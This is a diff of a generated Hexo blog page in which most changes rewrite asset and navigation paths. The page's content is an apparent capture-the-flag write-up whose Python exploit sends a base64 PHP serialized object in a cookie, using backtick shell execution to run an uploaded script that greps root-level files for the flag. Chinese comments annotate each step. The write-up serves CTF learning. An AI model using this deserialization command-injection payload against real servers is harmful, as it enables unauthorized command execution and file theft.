@@ -24,18 +24,18 @@
 
   
   
-    <link href="/kyriota/favicon.ico" rel="icon">
+    <link href="/kyriota.github.io/favicon.ico" rel="icon">
   
   
-  <link rel="stylesheet" href="/kyriota/css/bootstrap.min.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/kyriota/css/font-awesome.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/kyriota/css/style.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/kyriota/css/responsive.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/kyriota/css/highlight.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/kyriota/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/kyriota.github.io/css/google-fonts.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
-  <script src="/kyriota/js/jquery-2.0.3.min.js"></script>
+  <script src="/kyriota.github.io/js/jquery-2.0.3.min.js"></script>
 
   <!-- analytics -->
   
@@ -61,7 +61,7 @@ var _hmt = _hmt || [];
 </script>
 
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/kyriota/atom.xml" title="KYRIOTA" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/kyriota.github.io/atom.xml" title="KYRIOTA" type="application/atom+xml">
 </head>
 
  <body>  
@@ -73,36 +73,36 @@ var _hmt = _hmt || [];
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-	  <a class="navbar-brand" href="/kyriota/">KYRIOTA</a>
+	  <a class="navbar-brand" href="/kyriota.github.io/">KYRIOTA</a>
       <div class="collapse navbar-collapse nav-menu">
 		<ul class="nav navbar-nav">
 		  
 		  <li>
-			<a href="/kyriota/archives" title="All the articles.">
+			<a href="/kyriota.github.io/archives" title="All the articles.">
 			  <i class=""></i>Archives
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/kyriota/categories" title="All the categories.">
+			<a href="/kyriota.github.io/categories" title="All the categories.">
 			  <i class=""></i>Categories
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/kyriota/tags" title="All the tags.">
+			<a href="/kyriota.github.io/tags" title="All the tags.">
 			  <i class=""></i>Tags
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/kyriota/about" title="About me.">
+			<a href="/kyriota.github.io/about" title="About me.">
 			  <i class=""></i>About
 			</a>
 		  </li>
 		  
 		  <li>
-			<a href="/kyriota/atom.xml" title="Subscribe me.">
+			<a href="/kyriota.github.io/atom.xml" title="Subscribe me.">
 			  <i class=""></i>RSS
 			</a>
 		  </li>
@@ -173,7 +173,7 @@ var _hmt = _hmt || [];
 </ul>
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echo的快捷用法，但须在php.ini里打开short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</span></span><br><span class="line"><span class="comment">#                                          ↓                 ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            ↑</span></span><br><span class="line"><span class="comment">#                                     执行后面路径下的文件</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">git = base64.b64encode(git.encode()).decode()</span><br><span class="line">cookies = &#123;<span class="string">&#x27;git&#x27;</span>: git&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                打开根目录下全部文件并显示在标准输出</span></span><br><span class="line"><span class="comment">#                             |</span></span><br><span class="line"><span class="comment">#                             |   查找字符串</span></span><br><span class="line"><span class="comment">#                             ↓      ↓</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&quot;#!/bin/sh\ncat /* | grep flag&quot;</span>&#125;</span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                 ↑         ↑       ↑</span></span><br><span class="line"><span class="comment">#                 |       换行符   pipe，以前面的返回作为参数来执行后面的命令，相当于在根目录里找flag </span></span><br><span class="line"><span class="comment">#                 |</span></span><br><span class="line"><span class="comment">#      #!是一个特殊的表示符，其后跟着解释此脚本的shell路径</span></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"></span><br><span class="line">a = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>	  
+<link rel="stylesheet" href="/kyriota.github.io/css/spoiler.css" type="text/css"><script src="/kyriota.github.io/js/spoiler.js" type="text/javascript" async></script>	  
 	</div>
 
 	<div>
@@ -182,13 +182,13 @@ var _hmt = _hmt || [];
 
     
     
-    <a href="/kyriota/2021/03/28/PHP奇怪的目录访问机制/" type="button" class="btn btn-default"><i
+    <a href="/kyriota.github.io/2021/03/28/PHP奇怪的目录访问机制/" type="button" class="btn btn-default"><i
                 class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
-    <a href="/kyriota/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    <a href="/kyriota.github.io/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/kyriota/2021/03/24/社工-初步收集/" type="button" class="btn btn-default ">Next<i
+    <a href="/kyriota.github.io/2021/03/24/社工-初步收集/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -228,7 +228,7 @@ var _hmt = _hmt || [];
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/kyriota/categories/Web/">Web<span>5</span></a></li>
+    <li><a href="/kyriota.github.io/categories/Web/">Web<span>5</span></a></li>
   </li>
 
     </ul>
@@ -241,7 +241,7 @@ var _hmt = _hmt || [];
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/kyriota/tags/Web/">Web<span>5</span></a></li> <li><a href="/kyriota/tags/wp/">wp<span>3</span></a></li> <li><a href="/kyriota/tags/miniL/">miniL<span>1</span></a></li>
+  <li><a href="/kyriota.github.io/tags/Web/">Web<span>5</span></a></li> <li><a href="/kyriota.github.io/tags/wp/">wp<span>3</span></a></li> <li><a href="/kyriota.github.io/tags/miniL/">miniL<span>1</span></a></li>
     </ul>
 	</div>
 		
@@ -287,15 +287,15 @@ var _hmt = _hmt || [];
   <span>⬆︎TOP</span>
 </a>
 
-<script src="/kyriota/js/jquery.imagesloaded.min.js"></script>
-<script src="/kyriota/js/gallery.js"></script>
-<script src="/kyriota/js/bootstrap.min.js"></script>
-<script src="/kyriota/js/main.js"></script>
-<script src="/kyriota/js/search.js"></script> 
+<script src="/kyriota.github.io/js/jquery.imagesloaded.min.js"></script>
+<script src="/kyriota.github.io/js/gallery.js"></script>
+<script src="/kyriota.github.io/js/bootstrap.min.js"></script>
+<script src="/kyriota.github.io/js/main.js"></script>
+<script src="/kyriota.github.io/js/search.js"></script> 
 
 
-<link rel="stylesheet" href="/kyriota/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/kyriota/fancybox/jquery.fancybox.pack.js"></script>
+<link rel="stylesheet" href="/kyriota.github.io/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/kyriota.github.io/fancybox/jquery.fancybox.pack.js"></script>
 <script type="text/javascript">
 (function($){
   $('.fancybox').fancybox();
@@ -309,7 +309,7 @@ var _hmt = _hmt || [];
 	 if (search_path.length == 0) {
 	 	search_path = "search.xml";
 	 }
-	 var path = "/kyriota/" + search_path;
+	 var path = "/kyriota.github.io/" + search_path;
      searchFunc(path, 'local-search-input', 'local-search-result');
    </script>
 
